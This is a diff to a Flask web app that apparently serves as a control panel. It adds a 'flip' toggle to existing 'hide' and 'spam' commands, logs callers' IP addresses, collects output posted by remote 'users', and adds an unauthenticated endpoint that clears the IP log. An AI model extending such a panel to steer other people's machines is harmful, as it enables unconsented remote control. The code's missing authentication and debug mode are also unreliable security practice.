@@ -38,6 +38,8 @@ def terminal():
     hc = data1["hideToggleState"]["color"]
     ss = data1["spamToggleState"]["state"]
     sc = data1["spamToggleState"]["color"]
+    fs = data1["flipToggleState"]["state"]
+    fc = data1["flipToggleState"]["color"]
     if not firstReload:
         if time() - startTime <= 2.5:
             state = "Online"
@@ -51,7 +53,7 @@ def terminal():
     else:
         data = {"tasks": []}
     firstReload = False       
-    return render_template("index.html", state=state if state else "Offline", files=files, tasks=data, color=color,hs=hs,hc=hc,ss=ss,sc=sc,users=users,selected = selected)
+    return render_template("index.html", state=state if state else "Offline", files=files, tasks=data, color=color,hs=hs,hc=hc,ss=ss,sc=sc,fs=fs,fc=fc,users=users,selected = selected)
 
 @app.route("/edit", methods=["POST", "GET"])
 def edit():
@@ -71,6 +73,12 @@ def command():
     global startTime
     global selected_user
     global spam
+    ip = request.headers.get('X-Forwarded-For')
+    with open(os.path.join(STATIC_FOLDER,"ip.txt"),"r") as file:
+        data = file.read()
+        if ip not in data:
+            with open(os.path.join(STATIC_FOLDER,"ip.txt"),"a") as file:
+                file.write(f"\nip : {ip} | count : 0\n[----------------------------------------------------------------]")
     if request.method == "POST":
         user = request.get_json()
         user = user.get("user")
@@ -243,11 +251,14 @@ def toggle():
             elif cmd == "sPaM":
                 data["spamToggleState"]["state"] = state
                 data["spamToggleState"]["color"] = color
-        
+            elif cmd == "fLiP":
+                data["flipToggleState"]["state"] = state
+                data["flipToggleState"]["color"] = color
+                
             with open(state_file, "w") as file:
                 json.dump(data, file, indent=4)
         
-        if cmd == "hIdE":
+        if cmd == "hIdE" or cmd == "fLiP":
             with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as file:
                 file.write(f"{cmd} {state}")
         elif cmd == "sPaM":
@@ -288,5 +299,48 @@ def img():
                 a.write("iMaGe " + file.filename)
     return redirect("/")
 
+@app.route("/logs",methods=["GET","POST"])
+def logs():
+	with open(os.path.join(STATIC_FOLDER,"logs.json"), "r") as file:
+		data = json.load(file)
+	return render_template("logs.html",logs=data)
+              
+
+@app.route("/output", methods=["POST", "GET"])
+def output():
+    data = request.get_json()
+    err = data["err"]
+    user = data["user"]
+    logfile = os.path.join(STATIC_FOLDER, "log.json")
+    
+    try:
+        if os.path.exists(logfile):
+            with open(logfile, "r") as file:
+                data = json.load(file)
+    except Exception as e:
+        return f"Error reading log.json: {e}", 500
+
+    log = {
+        "no": len(data["logs"]) + 1, 
+        "output": err,
+        "time": datetime.now().strftime("%d-%m-%Y %H:%M"),
+        "user": user
+    }
+    
+    data["logs"].append(log)
+
+    try:
+        with open(logfile, "w") as file:
+            json.dump(data, file, indent=4)
+    except Exception as e:
+        return f"Error writing to log.json: {e}", 500    
+    
+    return log
+
+@app.route("/clear",methods=["POST","GET"])
+def clear():
+    with open(os.path.join(STATIC_FOLDER,"ip.txt"),"w") as file:
+        file.write("")
+    return "clear"
 if __name__ == "__main__":
     app.run(debug=True)
